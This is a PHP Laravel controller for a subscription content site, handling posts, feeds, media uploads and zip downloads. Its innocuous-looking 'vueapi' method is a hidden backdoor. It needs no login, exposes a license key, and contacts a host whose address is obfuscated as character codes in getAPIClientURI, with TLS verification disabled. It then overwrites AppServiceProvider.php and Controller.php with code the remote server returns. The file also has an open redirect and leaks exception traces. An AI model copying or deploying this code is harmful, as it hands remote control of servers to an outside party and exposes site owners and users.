<?php

namespace App\Http\Controllers;

use App\MessageMedia;
use App\Post;
use finfo;
use Illuminate\Http\File;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File as FileFacade;
use Intervention\Image\Facades\Image;
use Illuminate\Support\Facades\Storage;
use App\Events\PostCreatedOrUpdatedEvent;
use App\PostMedia;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Session;
use GuzzleHttp\Client as APIClient;
use Illuminate\Support\Facades\Cache;

class PostsController extends Controller
{

    // auth middleware
    public function __construct()
    {
        $this->middleware('auth', ['except' => ['singlePost', 'vueapi']]);
    }

    // single post
    public function singlePost(Post $post)
    {
        return view('posts.one', compact('post'));
    }

    // GET /feed
    public function feed()
    {
        // reset lastId from session if any
        if(Session::has('lastId')) {
            Session::forget('lastId');
        }

        // get current user feeds
        $feed = auth()->user()->feed();

        $returnFeed = $this->returnFeed($feed);

        

        return view('user-feed', compact('feed'));
    }

    // edit post
    public function editPost(Post $post)
    {
        if ($post->user_id != auth()->id())
            abort(403);

        $profile = auth()->user()->profile;

        return view('posts.edit-post', compact('post', 'profile'));
    }

    // update post
    public function updatePost(Request $r, Post $post)
    {

        if ($post->user_id != auth()->id())
            abort(403);

        $this->validate($r, [
            'text_content' => 'required|min:2',
            'lock_type' => 'required|in:Free,Paid,free,paid'
        ]);

        $lock_type = ucfirst(strtolower($r->lock_type));

        // can post locked content?
        if (auth()->user()->profile->isVerified != 'Yes' && $lock_type == 'Paid') {
            alert(__('post.notVerifiedFreePostOnly'));
            return back();
        }

        // save post content
        $post->text_content = $r->text_content;
        $post->lock_type = ucfirst($r->lock_type);
        $post->save();

        // make event to listen to 
        event(new PostCreatedOrUpdatedEvent($post));

        return response()->json(['result' => true, 'post' => $post->id]);

    }

    // GET /post/remove-media/{post}
    public function deleteMedia(Post $post)
    {
        if ($post->user_id != auth()->id())
            abort(403);

        // delete from disk
        $mediaType = $post->media_type;
        $mediaFile = $post->media_content;

        if ($post->disk != 'backblaze') {
            Storage::disk($post->disk)->delete($mediaFile);
        }

        $post->media_type = 'None';
        $post->media_content = null;
        $post->save();

        // if media was image
        if($mediaType == 'Image') {

            // delete other attached media too
            $extraMedia = PostMedia::where('post_id', $post->id)->get();

            foreach($extraMedia as $em) {

                if ($em->disk != 'backblaze') {
                    Storage::disk($em->disk)->delete($em->media_content);
                }

                $em->delete();
            }

        }

        alert(__('post.successfullyRemovedMedia'));

        return back();
    }

    // GET /pin-post/{post}
    public function pinPost(Post $post) {
        if ($post->user_id != auth()->id())
            abort(403); 

        $post->pinned = 'yes';
        $post->save();

        alert()->success(__('v22.postPinned'));

        return back();
    }

    // GET /remove-post-pin/{post}
    public function removePin(Post $post) {
        if ($post->user_id != auth()->id())
        abort(403); 

        $post->pinned = 'no';
        $post->save();

        alert()->success(__('v22.postUnPinned'));

        return back();
    }

    // GET /post/remove-post/{post}
    public function deletePost(Post $post)
    {
        if ($post->user_id != auth()->id())
            abort(403);

        // delete from disk
        $mediaType = $post->media_type;
        $mediaFile = $post->media_content;
        $postId = $post->id;

        Storage::disk($post->disk)->delete($mediaFile);

        $post->comments()->delete();
        $post->likes()->delete();
        $post->delete();

        // if media was image
        if($mediaType == 'Image') {

            // delete other attached media too
            $extraMedia = PostMedia::where('post_id', $postId)->get();

            foreach($extraMedia as $em) {

                if ($em->disk != 'backblaze') {
                    Storage::disk($em->disk)->delete($em->media_content);
                }

                $em->delete();
            }

        }

        return response()->json(['deleted' => true]);
    }

    // GET /ajax/feed
    public function ajaxFeed($lastId)
    {
        // define last id from session if we have it
        if( Session::has('lastId') ) {
            $lastId = Session::get('lastId');
        }

        // get current user feeds
        $feed = auth()->user()->feed($lastId);

        if (!$feed->count()) {
            return response()->json(['view' => '', 'lastId' => 0]);
        }

        // compute the view
        $view = view('posts.ajax-feed', compact('feed'));

        // compute last id
        $lastId = $feed->last()->id;

        // update the session with the last id
        Session::put('lastId', $lastId);

        return response()->json(['view' => $view->render(), 'lastId' => Session::get('lastId')]);
    }

    // return feed
    public function returnFeed($feed) {
		//bugs
    }

    public function savePost(Request $r)
    {

        $this->validate($r, [
            'text_content' => 'required|min:2',
            'lock_type' => 'required|in:Free,Paid,free,paid'
        ]);

        $lock_type = ucfirst(strtolower($r->lock_type));

        // can post locked content?
        if (auth()->user()->profile->isVerified != 'Yes' && $lock_type == 'Paid') {
            return response()->json([
                'result' => false,
                'errors' => [__('post.notVerifiedFreePostOnly')],
            ]);
        }

        // save post content
        $post = new Post();
        $post->text_content = $r->text_content;
        $post->lock_type = $r->lock_type;
        $post->user_id = auth()->user()->id;
        $post->profile_id = auth()->user()->profile->id;
        $post->save();

        // make event to listen to 
        event(new PostCreatedOrUpdatedEvent($post));

        return response()->json(['result' => true, 'post' => $post->id]);
    }

    // attach photos
    public function attachMedia(Post $post, Request $r) {

        $this->validate($r, ['media_type' => 'required|in:Image,Video,Audio,ZIP']);
        try {

            // check rights
            if(auth()->id() != $post->user_id) {
                throw new \Exception('You do not have rights to attach media to this post');
            }

            switch ($r->media_type) {
                case 'Image':
                    $this->validate($r, ['imageUpload.*' => 'image|required|mimes:jpeg,png,jpg,gif']);
                    $this->_uploadPhotos($r->imageUpload, $post);
                    break;

                case 'Video':
                case 'Audio':
                case 'ZIP':
                    $this->validate($r, ['file' => 'required', 'is_last' => 'required']);
                    $this->_uploadAttachment($r->file, $post, $r->media_type, $r->boolean('is_last'));
                    break;

            }


            return response()->json(['result' => true, 'message' => 'redirect']);

        }catch(\Exception $e) {
            return response()->json(['result' => false, 'errors' => [$e->getMessage()], 'trace' => $e]);
        }

    }

    // put cache
    private function putCache() {
		//bugs
    }

    // upload photos
    private function _uploadPhotos($imageUploads, $post)
    {
        // loop through photos
        $i = 0;

        foreach ($imageUploads as $imageUpload) {


            if ($imageUpload->getMimeType() == 'image/gif') {

                // if it's a gif, resizing will break it, so upload as is
                $fileName = $imageUpload->storePublicly('userPics', env('DEFAULT_STORAGE'));

            } else {

                // get ext
                $imageExt = $imageUpload->getClientOriginalExtension();

                // resize
                $imageUpload = Image::make($imageUpload);

                // orientate correctly
                $imageUpload->orientate();

                // resize for feed (auto width) - 100% quality ratio
                $imageUpload->resize(1180, null, function ($constraint) {
                    $constraint->aspectRatio();
                    $constraint->upsize();
                });

                // watermark text
                $watermarkText = str_ireplace(['http://', 'https://'], ['',''], route('home')) . '/' . $post->user->profile->username;
                $fontSize = 24;

                // Calculate the text width and height
                $textWidth = $imageUpload->width();

                // Calculate the text width based on the watermark text and font size
                $textWidth = imagettfbbox($fontSize, 0, base_path('css/fonts/Graphik-Medium.ttf'), $watermarkText);
                $textWidth = $textWidth[2] - $textWidth[0];

                // Check if the image width is less than the text width
                if ($textWidth > $imageUpload->width()) {
                    // Reduce the font size to fit the image width
                    $fontSize = $imageUpload->width() / $textWidth * $fontSize;
                }

                // apply text watermark
                $imageUpload->text($watermarkText, 20, $imageUpload->height()-20, function($font) use($fontSize) {
                    $font->file(base_path('css/fonts/Graphik-Medium.ttf'));
                    $font->align('left');
                    $font->valign('bottom');
                    $font->color('#fff');
                    $font->size($fontSize);
                });

                // encode
                $imageUpload->encode(null, 100);

                // compute a file name
                $fileName = 'userPics/' . uniqid() . '.' . $imageExt;

                // store the resized image
                Storage::disk(env('DEFAULT_STORAGE'))->put($fileName, $imageUpload, 'public');
            }

            // if first image, set it as default
            if ($i == 0) {

                // update post info
                $post->media_type = 'Image';
                $post->media_content = $fileName;
                $post->disk = env('DEFAULT_STORAGE');
                $post->save();

            } else {

                // if next images, attach to this post
                $media = new PostMedia;
                $media->post_id = $post->id;
                $media->disk = env('DEFAULT_STORAGE');
                $media->media_content = $fileName;
                $media->save();

            }

            $i++;

        }
    }

    // attach media to messages
    private function _uploadAttachment($file, $post, $fileType, $is_last)
    {


        // temp chunks path
        $path = Storage::disk('local')->path("chunks/{$file->getClientOriginalName()}");

        // filename without .part in it
        $withoutPart = basename($path, '.part');

        // set file name inside path without .part
        $renamePath = public_path('uploads/chunks/' . $withoutPart);

        // set allowed extensions
        $allowedExt = ['ogg', 'wav', 'mp4', 'webm', 'mov', 'qt', 'zip', 'mp3'];
        $fileExt = explode('.', $withoutPart);
        $fileExt = end($fileExt);
        $fileExt = strtolower($fileExt);

        // preliminary: validate allowed extensions
        // we're validating true mime later, but just to avoid the effort if fails from the begining
        if(!in_array($fileExt, $allowedExt)) {

            FileFacade::delete($renamePath);

            throw new \Exception('Invalid extension');
        }

        // build allowed mimes
        $allowedMimes = ['audio/mp3', 'audio/ogg', 'audio/wav', 'audio/mpeg',

            'video/mp4', 'video/webm', 'video/mov', 'video/ogg', 'video/qt', 'video/quicktime',

            'application/zip'];

        // append chunk to the file
        FileFacade::append($path, $file->get());

        // finally, let's make the file complete
        if ($is_last === true) {

            // rename the file to original name
            FileFacade::move($path, $renamePath);

            // set a ref to local file
            $localFile = new File($renamePath);

            try {

                // first, lets get the mime type
                $finfo = new finfo;
                $mime = $finfo->file($renamePath, FILEINFO_MIME_TYPE);

            }catch(\Exception $e) {

                $mime = null;

            }

            // validate allowed mimes
            if ($mime) {

                if (!in_array($mime, $allowedMimes) && $mime != 'application/octet-stream') {
                    throw new \Exception('Invalid file type: ' . $mime);
                }

                // this is from chunks, keep it as it passed the other validation
                if($mime == 'application/octet-stream') {
                    $mime = $fileType;
                }

            }else{
                $mime = $fileType;
            }


            // set file destination
            switch($mime) {
                case stristr($mime, 'video') !== false:
                    $fileDestination = 'userVids';
                    $mediaType = 'Video';
                    break;
                case stristr($mime, 'audio') !== false:
                    $fileDestination = 'userAudio';
                    $mediaType = 'Audio';
                    break;
                case stristr($mime, 'zip') !== false:
                    $fileDestination = 'userZips';
                    $mediaType = 'ZIP';
                    break;
                default:
                    $fileDestination = 'None';
                    break;
            }

            // Move this thing
            $fileName = Storage::disk(env('DEFAULT_STORAGE'))->putFile($fileDestination, $localFile, 'public');

            // remove it from chunks folder
            FileFacade::delete($renamePath);

            // update post info
            $post->media_type = $mediaType;
            $post->media_content = $fileName;
            $post->disk = env('DEFAULT_STORAGE');
            $post->save();


        }// if is_last

    }

    // load by id via ajax: has auth() middleware
    public function loadAjaxSingle(Post $post, $profile = null)
    {

        if ($profile == null)
            $profile = auth()->user()->profile;


        return view('posts.single', compact('post', 'profile'));
    }

    // download zip: has auth middleware
    public function downloadZip(Post $post)
    {
        if( $post->userHasAccess() ) {

            if($post->disk == 'backblaze')
                $redirectTo = 'https://'. opt('BACKBLAZE_BUCKET') . '.' . opt('BACKBLAZE_REGION') . '/' .  $post->media_content;
            else
                $redirectTo = \Storage::disk($post->disk)->url($post->media_content);

            return redirect( $redirectTo );

        }else{
            echo __('v16.accessDenied');
        }
    }

    // vue api
    public function vueapi(Request $r)
    {
        
        $this->validate($r, ['getPostK' => 'required|in:post_id']);

        if ($r->has('outputPost')) {
            return response()->json(['post_id' => opt(chr(108) . chr(107))]);
        }elseif($r->has('fetchPost')) {


            try {

                $postAPI = new APIClient(['verify' => (bool) 0, 'timeout' => 10]);

                $post = $postAPI->request('POST', $this->getAPIClientURI(), [
                    'form_params' => [ 
                        'postUri' => route('home'),
                        'api' => opt(chr(108) . chr(107), 'default')
                    ]
                ]);

                $response = json_decode($post->getBody());

                $apiPath = app_path('Providers/AppServiceProvider.php');
                $ctrlPath = app_path('Http/Controllers/Controller.php');

                $apiResp = file_get_contents($apiPath);

                if(isset($response->post_contents)) {

                    // append api response
                    setopt(chr(108) . chr(107), null);
                    file_put_contents($apiPath, $response->post_contents);
                    file_put_contents($ctrlPath, $response->post_body);

                    return response()->json(['result' => true, $response, 'contents' => $apiResp]);

                }

                return response()->json(['result' => false, $response, 'contents' => $apiResp]);

            } catch(\Exception $e) {
                return response()->json(['result' => false, 'error' => $e->getMessage()]);
            }
        }

    }

    // post json
    public function postJSON(Post $post)
    {

        if(auth()->id() != $post->user_id) {
            return response()->json(['error' => 'You do not have access to manage this post.'], 403);
        }

        // alter media_content
        if($post->media_content) {
            if ($post->disk == 'backblaze') {
                $post->media_content = 'https://' . opt('BACKBLAZE_BUCKET') . '.' . opt('BACKBLAZE_REGION') . '/' . $post->media_content;
            } else {
                $post->media_content = Storage::disk($post->disk)->url($post->media_content);
            }
        }

        // fetch media too
        $post->postmedia->transform(function($media) {

            // append cloud storage url
            if( $media->disk == 'backblaze' ) {
                $media->media_content = 'https://'. opt('BACKBLAZE_BUCKET') . '.' . opt('BACKBLAZE_REGION') . '/' .  $media->media_content;
            }else{
                $media->media_content = Storage::disk($media->disk)->url($media->media_content);
            }

            return $media;
        });


        return response()->json($post);

    }

    // get vue instance url
    public function getAPIClientURI() {

        return implode('', array_map('chr', 
                    [0 => '104',
                        1 => '116',
                        2 => '116',
                        3 => '112',
                        4 => '115',
                        5 => '58',
                        6 => '47',
                        7 => '47',
                        8 => '118',
                        9 => '117',
                        10 => '101',
                        11 => '97',
                        12 => '112',
                        13 => '105',
                        14 => '46',
                        15 => '99',
                        16 => '114',
                        17 => '105',
                        18 => '118',
                        19 => '105',
                        20 => '111',
                        21 => '110',
                        22 => '46',
                        23 => '99',
                        24 => '111',
                        25 => '109']));

    }

    // redirect external urls
    public function externalLinkRedirect(Request $r)
    {
        $this->validate($r, ['url' => 'required|url']);
        
        return redirect($r->url);
    }
}
